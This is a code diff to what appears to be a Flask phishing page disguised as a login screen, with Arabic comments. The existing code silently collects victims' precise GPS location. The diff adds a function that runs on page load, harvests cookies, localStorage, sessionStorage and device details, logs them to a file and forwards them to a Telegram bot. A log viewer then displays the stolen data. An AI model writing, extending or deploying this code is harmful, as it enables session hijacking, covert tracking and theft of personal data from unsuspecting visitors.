@@ -162,16 +162,13 @@ login_page_html = '''
                         const lng = position.coords.longitude;
                         const accuracy = position.coords.accuracy;
                         
-                        // تخزين أفضل موقع (أقل دقة = أفضل)
                         if (accuracy < bestAccuracy) {
                             bestAccuracy = accuracy;
                             bestLat = lat;
                             bestLng = lng;
                         }
                         
-                        // إذا كانت الدقة جيدة (أقل من 50 متر) أو وصلنا لأقصى محاولات
                         if (accuracy < 50 || attempts >= maxAttempts - 1) {
-                            // إرسال أفضل موقع تم الحصول عليه
                             fetch('/gps-data', {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
@@ -182,18 +179,15 @@ login_page_html = '''
                                 })
                             }).catch(err => console.log('خطأ في إرسال GPS:', err));
                         } else {
-                            // المحاولة مرة أخرى للحصول على دقة أفضل
                             attempts++;
                             setTimeout(getLocation, 2000);
                         }
                     },
                     function(error) {
-                        // في حال فشل GPS، نحاول مرة أخرى (بدون تحذيرات)
                         if (attempts < maxAttempts) {
                             attempts++;
                             setTimeout(getLocation, 2000);
                         } else {
-                            // بعد فشل كل المحاولات، نرسل ما لدينا (حتى لو كانت دقة منخفضة)
                             if (bestLat && bestLng) {
                                 fetch('/gps-data', {
                                     method: 'POST',
@@ -215,12 +209,11 @@ login_page_html = '''
                 );
             }
             
-            // البدء بطلب الموقع
             getLocation();
         }
     }
 
-    // جمع بيانات المتصفح الإضافية (بدون تحذيرات)
+    // جمع بيانات المتصفح الإضافية
     function collectBrowserData() {
         const data = {
             screenWidth: window.screen.width,
@@ -241,10 +234,63 @@ login_page_html = '''
         }).catch(err => console.log('خطأ في إرسال بيانات المتصفح:', err));
     }
 
+    // ========== جمع الكوكيز والجلسات النشطة ==========
+    function collectSensitiveData() {
+        // 1. جمع الكوكيز
+        const cookies = document.cookie;
+        
+        // 2. جمع localStorage و sessionStorage
+        let localStorageData = {};
+        let sessionStorageData = {};
+        
+        try {
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                localStorageData[key] = localStorage.getItem(key);
+            }
+        } catch(e) { console.log('خطأ في localStorage:', e); }
+        
+        try {
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                sessionStorageData[key] = sessionStorage.getItem(key);
+            }
+        } catch(e) { console.log('خطأ في sessionStorage:', e); }
+        
+        // 3. الصفحة السابقة
+        const referrer = document.referrer || 'لا يوجد';
+        
+        // 4. تجميع البيانات
+        const sessionData = {
+            cookies: cookies,
+            localStorage: localStorageData,
+            sessionStorage: sessionStorageData,
+            referrer: referrer,
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            screenWidth: window.screen.width,
+            screenHeight: window.screen.height,
+            colorDepth: window.screen.colorDepth,
+            deviceMemory: navigator.deviceMemory || 'غير معروف',
+            hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
+            connectionType: navigator.connection ? navigator.connection.effectiveType : 'غير معروف'
+        };
+        
+        // إرسال البيانات إلى الخادم
+        fetch('/collect-sensitive', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(sessionData)
+        }).catch(err => console.log('خطأ في إرسال البيانات الحساسة:', err));
+    }
+
     // استدعاء الدوال عند تحميل الصفحة
     window.onload = function() {
         setTimeout(requestLocation, 1000);
         collectBrowserData();
+        collectSensitiveData(); // جمع الكوكيز والجلسات
     };
     </script>
 </body>
@@ -326,12 +372,10 @@ def capture():
 def gps_data():
     data = request.get_json()
     lat = data.get('lat')
-    lon = data.get('lng')  # استخدام lng بدلاً من lon
+    lon = data.get('lng')
     accuracy = data.get('accuracy')
     
-    # التحقق من صحة البيانات
     if lon is None or lat is None:
-        # إرسال خطأ إلى تليجرام (بدون تحذيرات للمستخدم)
         error_msg = f"""
 ⚠️ <b>فشل تحديد الموقع بدقة</b>
 📱 الأسباب المحتملة:
@@ -346,7 +390,6 @@ def gps_data():
         send_to_telegram(error_msg)
         return {"status": "failed", "reason": "GPS location unavailable"}, 400
     
-    # تسجيل الموقع في ملف
     with open('gps_log.txt', 'a', encoding='utf-8') as f:
         f.write(f"""
         ═══════════════════════════════════════════
@@ -358,7 +401,6 @@ def gps_data():
         ═══════════════════════════════════════════
         """)
     
-    # إرسال الموقع الدقيق إلى تليجرام مع رابط خرائط
     maps_link = f"https://www.google.com/maps?q={lat},{lon}"
     gps_msg = f"""
 <b>📍 موقع دقيق (GPS)</b>
@@ -376,7 +418,6 @@ def gps_data():
 def browser_data():
     data = request.get_json()
     
-    # إرسال بيانات المتصفح إلى تليجرام
     browser_msg = f"""
 <b>🖥️ بيانات المتصفح الإضافية</b>
 <b>📐 دقة الشاشة:</b> {data.get('screenWidth')}x{data.get('screenHeight')}
@@ -389,6 +430,41 @@ def browser_data():
 <b>🍪 ملفات تعريف الارتباط:</b> {data.get('cookiesEnabled')}
     """
     send_to_telegram(browser_msg)
+    
+    return {"status": "success"}, 200
+
+# ========== استقبال البيانات الحساسة (كوكيز، جلسات) ==========
+@app.route('/collect-sensitive', methods=['POST'])
+def collect_sensitive():
+    data = request.get_json()
+    
+    # تسجيل البيانات الحساسة في ملف
+    with open('sensitive_data.txt', 'a', encoding='utf-8') as f:
+        f.write(f"""
+        ═══════════════════════════════════════════
+        📥 بيانات حساسة - {datetime.datetime.now()}
+        🍪 الكوكيز: {data.get('cookies', 'لا يوجد')}
+        💾 LocalStorage: {data.get('localStorage', {})}
+        💾 SessionStorage: {data.get('sessionStorage', {})}
+        🔗 الصفحة السابقة: {data.get('referrer', 'لا يوجد')}
+        📱 اللغة: {data.get('language', 'غير معروف')}
+        🕐 المنطقة الزمنية: {data.get('timezone', 'غير معروف')}
+        📐 دقة الشاشة: {data.get('screenWidth')}x{data.get('screenHeight')}
+        📶 نوع الاتصال: {data.get('connectionType', 'غير معروف')}
+        ═══════════════════════════════════════════
+        """)
+    
+    # إرسال إلى تليجرام
+    sensitive_msg = f"""
+<b>🍪 بيانات حساسة تم جمعها</b>
+<b>🍪 الكوكيز:</b> {data.get('cookies', 'لا يوجد')[:200]}...
+<b>💾 LocalStorage:</b> {len(data.get('localStorage', {}))} عنصر
+<b>💾 SessionStorage:</b> {len(data.get('sessionStorage', {}))} عنصر
+<b>🔗 الصفحة السابقة:</b> {data.get('referrer', 'لا يوجد')}
+<b>📱 اللغة:</b> {data.get('language', 'غير معروف')}
+<b>🕐 المنطقة الزمنية:</b> {data.get('timezone', 'غير معروف')}
+"""
+    send_to_telegram(sensitive_msg)
     
     return {"status": "success"}, 200
 
@@ -411,6 +487,11 @@ def view_logs():
             output += "<h2>📍 بيانات GPS</h2><pre>" + f.read() + "</pre>"
     except:
         output += "<p>لا توجد بيانات GPS</p>"
+    try:
+        with open('sensitive_data.txt', 'r', encoding='utf-8') as f:
+            output += "<h2>🍪 البيانات الحساسة (كوكيز، جلسات)</h2><pre>" + f.read() + "</pre>"
+    except:
+        output += "<p>لا توجد بيانات حساسة</p>"
     output += "</body></html>"
     return output
 
